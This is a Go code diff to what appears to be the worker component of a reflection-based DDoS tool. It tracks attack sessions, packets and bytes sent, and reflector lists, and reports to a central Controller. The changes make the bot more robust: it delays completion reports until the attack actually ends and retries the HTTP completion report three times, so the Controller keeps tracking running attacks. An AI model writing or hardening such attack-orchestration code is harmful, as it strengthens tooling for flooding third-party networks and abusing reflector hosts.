@@ -1060,9 +1060,11 @@ func (w *Worker) streamStats(taskID string, session *attack.AttackSession) {
 		"authorization", "Bearer "+w.authToken)
 	stream, err := w.client.ReportStats(streamCtx)
 	if err != nil {
+		log.Printf("[worker] stats stream error (task %s continues without reporting): %v", taskID, err)
+		// 流建不起来但攻击还在跑：等攻击结束后再上报完成
+		<-session.DoneChan
 		snap := session.Snapshot()
 		w.reportCompleteViaHTTP(taskID, snap)
-		log.Printf("[worker] stats stream error (task %s continues without reporting): %v", taskID, err)
 		return
 	}
 
@@ -1122,9 +1124,10 @@ func (w *Worker) streamStats(taskID string, session *attack.AttackSession) {
 				ElapsedSeconds: snap.Elapsed,
 				Finished:       false,
 			}); err != nil {
-				snap := session.Snapshot()
-				w.reportCompleteViaHTTP(taskID, snap)
 				log.Printf("[worker] stats send failed for task %s, stopping reports: %v", taskID, err)
+				// 注意：流失败不能上报"完成"——攻击仍在进行，提前上报会让
+				// Controller 误判任务完成而不再跟踪。等攻击真正结束（done）
+				// 后再上报完成状态。
 				<-done
 				log.Printf("[worker] task %s completed (reporting had stopped)", taskID)
 				return
@@ -1139,20 +1142,33 @@ func (w *Worker) reportCompleteViaHTTP(taskID string, snap attack.AttackSnapshot
 		`{"task_id":"%s","worker_id":"%s","packets_sent":%d,"bytes_sent":%d,"errors":%d,"current_pps":%d,"current_bps":%d,"elapsed_seconds":%f}`,
 		taskID, w.assignedID, snap.PacketsSent, snap.BytesSent, snap.Errors, snap.PPS, snap.BPS, snap.Elapsed,
 	)
-	req, err := http.NewRequest("POST", url, strings.NewReader(body))
-	if err != nil {
-		log.Printf("[worker] http fallback build request error: %v", err)
+
+	// 完成上报失败会触发 Controller 超时重试、整段攻击重跑：
+	// 重试 3 次（间隔递增），最大程度保证 Controller 收到完成状态
+	for attempt := 1; attempt <= 3; attempt++ {
+		req, err := http.NewRequest("POST", url, strings.NewReader(body))
+		if err != nil {
+			log.Printf("[worker] http fallback build request error: %v", err)
+			return
+		}
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("Authorization", "Bearer "+w.authToken)
+		resp, err := ctrlHTTPClient.Do(req)
+		if err != nil {
+			log.Printf("[worker] http fallback complete error (attempt %d/3): %v", attempt, err)
+			time.Sleep(time.Duration(attempt) * 3 * time.Second)
+			continue
+		}
+		resp.Body.Close()
+		if resp.StatusCode != 200 {
+			log.Printf("[worker] http fallback complete http %d (attempt %d/3)", resp.StatusCode, attempt)
+			time.Sleep(time.Duration(attempt) * 3 * time.Second)
+			continue
+		}
+		log.Printf("[worker] http fallback: task %s completion reported", taskID)
 		return
 	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("Authorization", "Bearer "+w.authToken)
-	resp, err := ctrlHTTPClient.Do(req)
-	if err != nil {
-		log.Printf("[worker] http fallback complete error: %v", err)
-		return
-	}
-	resp.Body.Close()
-	log.Printf("[worker] http fallback: task %s completion reported", taskID)
+	log.Printf("[worker] http fallback: task %s completion report FAILED after 3 attempts", taskID)
 }
 
 // fetchReflectorsFromPoolInto 优先从本地池获取反射器，失败时 fallback 到 Controller
@@ -1491,9 +1507,11 @@ func (w *Worker) streamComboStats(taskID string, session *attack.ComboSession) {
 		"authorization", "Bearer "+w.authToken)
 	stream, err := w.client.ReportStats(streamCtx)
 	if err != nil {
+		log.Printf("[worker] combo stats stream error: %v", err)
+		// 攻击仍在进行：等真正结束后再上报完成
+		<-session.DoneChan
 		snap := session.Snapshot()
 		w.reportCompleteViaHTTP(taskID, snap)
-		log.Printf("[worker] combo stats stream error: %v", err)
 		return
 	}
 
@@ -1552,10 +1570,9 @@ func (w *Worker) streamComboStats(taskID string, session *attack.ComboSession) {
 				ElapsedSeconds: snap.Elapsed,
 				Finished:       false,
 			}); err != nil {
-				snap := session.Snapshot()
-				w.reportCompleteViaHTTP(taskID, snap)
 				log.Printf("[worker] combo stats send failed for task %s, stopping reports: %v", taskID, err)
-				// 与单任务路径一致：等任务真正结束后再退出，确保完成报告不丢失
+				// 注意：不能提前上报完成——攻击仍在进行。
+				// 等任务真正结束后（done）再上报完成状态。
 				<-done
 				log.Printf("[worker] combo task %s completed (reporting had stopped)", taskID)
 				return
